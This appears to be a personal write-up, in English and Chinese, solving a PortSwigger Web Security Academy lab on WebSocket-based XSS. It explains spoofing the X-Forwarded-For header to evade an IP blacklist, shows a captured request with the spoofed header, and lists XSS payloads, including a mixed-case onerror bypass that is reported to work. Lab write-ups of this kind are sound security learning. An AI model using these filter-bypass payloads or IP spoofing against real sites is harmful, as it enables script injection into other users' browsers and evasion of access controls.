This online shop has a live chat feature implemented using [WebSockets](https://portswigger.net/web-security/websockets).

It has an aggressive but flawed XSS filter.

To solve the lab, use a WebSocket message to trigger an `alert()` popup in the support agent's browser.


hint:
-   if you're struggling to bypass the XSS filter, try out our [XSS labs](https://portswigger.net/web-security/cross-site-scripting).
-   Sometimes you can bypass IP-based restrictions using HTTP headers like `X-Forwarded-For`.


該在線商店具有使用 [WebSockets](https://portswigger.net/web-security/websockets) 實現的實時聊天功能。

它有一個激進但有缺陷的 XSS 過濾器。

要解決實驗室問題，請使用 WebSocket 消息在支持代理的瀏覽器中觸發“alert()”彈出窗口。



暗示：
- 如果您正在努力繞過 XSS 過濾器，請嘗試我們的 [XSS 實驗室](https://portswigger.net/web-security/cross-site-scripting)。
- 有時您可以使用諸如“X-Forwarded-For”之類的 HTTP 標頭繞過基於 IP 的限制。



參考文章:
https://www.freebuf.com/articles/web/252298.html
https://www.cnblogs.com/Zeker62/p/15181972.html


X-Forwarded-For:
https://www.jianshu.com/p/15f3498a7fad






進入聊天室:

馬上來一個:
```
<img src=1 onerror=alert(1)></img>
```

直接被ban
```
"This address is blacklisted"
```


此時有兩種繞過的方式，一個是換IP proxy 或是 vpn 之類的。

另一個是: `X-Forwarded-For`.

```
attack 
1.1.1.1

proxy1 
2.2.2.2

proxy2 
3.3.3.3

server
4.4.4.4


```


attack -> proxy1-> proxy2 ->  server

attack 和 server 聊天


proxy1 :
remote_address = 1.1.1.1
發送 `X-Forwarded-For`  1.1.1.1 給 proxy 2


proxy2 :
remote_address = 2.2.2.2 
發送  `X-Forwarded-For`  1.1.1.1 , 2.2.2.2 給 server


server :
remote_address = 3.3.3.3
收到 `X-Forwarded-For`  1.1.1.1 , 2.2.2.2

server 想要知道真正的客戶是誰 可以根據 `X-Forwarded-For` 第一個ip


對於server response:

server 之需要丟給 3.3.3.3 就好剩下代理鏈會自己處理。
4.4.4.4 -> 3.3.3.3 (remote_address)




而 X-Forwarded-For 這個 http 頭是可選的。
如果沒有經過代理的話。



如果它邏輯是寫:
``` python

#代理
if (X-Forwarded-For):

	if(proxys in black_proxy_list):
		send( remote_address, "your ip is in  blacklist")
		
	else
		send( remote_address. data)
		

#直接連線
else:

	if(remote_address in blacklist)
		send( remote_address, "your ip is in  blacklist")

	else
		send( remote_address, data)

```


attack ip 54.23.1.1 被ban 
對於server 來說 remote_address 就是 54.23.1.1



假如  attack ip 54.23.1.1 被ban 
偽造了 `X-Forwarded-For`  1.1.1.1

對於server 來說 remote_address 就是 54.23.1.1
server 只過濾  proxy 是否為黑名單，
54.23.1.1 並不在 black_proxy_list 裡面。

所以可以通過，關於這點上面程式碼是瞎猜得，要看作者，邏輯是否有錯誤，或是過濾嚴不嚴格。



這題應該也是故意這樣設計。




BP加上去-Forwarded-For `1.1.1.1 
可以看見 live chat 

但是你在輸入訊息時，它是使用websocket 來傳輸的。

BP 只有 pro版 才有 websocket 的 intruder 這讓我非常的憂鬱。


於是只能先抓包然後 用外掛 postman intergration 給 postman 
```

Host: 0ac200e9034fe19fc0a23fbe00840082.web-security-academy.net
Cookie: session=fFd1zCBmIrT4HzRnW2uXrL8IcAqsDVsV
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-TW,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: https://0ac200e9034fe19fc0a23fbe00840082.web-security-academy.net/
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers
Connection: close
X-Forwarded-For: 1.1.1.1


```


post 使用 websocket 模組，加上htto header 可以成功對話。


但發現websocket 並不能用 curl 來實現，也許之後會寫一個python websocket 來解決。

而且實測postman 的抓包能力都沒bp好


或是直接使用高版本的 bp



最後發現
```
<img src=1 onerror='alert(1)'>
失敗


<img src=1 oNeRrOr=alert`1`>
成功




```





